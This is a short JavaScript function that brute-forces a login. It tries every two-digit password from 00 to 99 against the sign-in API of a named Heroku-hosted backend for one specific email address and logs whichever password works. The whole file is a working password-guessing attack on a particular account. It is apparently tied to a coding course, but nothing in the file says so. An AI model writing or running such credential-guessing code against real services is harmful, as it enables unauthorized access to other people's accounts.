export default function getPassword() {
    const email = 'igorg@mail.com';

    for (let i = 0; i <= 99; i += 1) {
        const password = `${i}`.padStart(2, 0);

        fetch('https://tms-js-pro-back-end.herokuapp.com/api/users/signin', {
            method: 'POST',
            headers: {
                Accept: 'application/json',
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email,
                password,
            }),
        }).then((res) => {
            if (res.ok) {
                console.log(password);
            }
        });

    }
}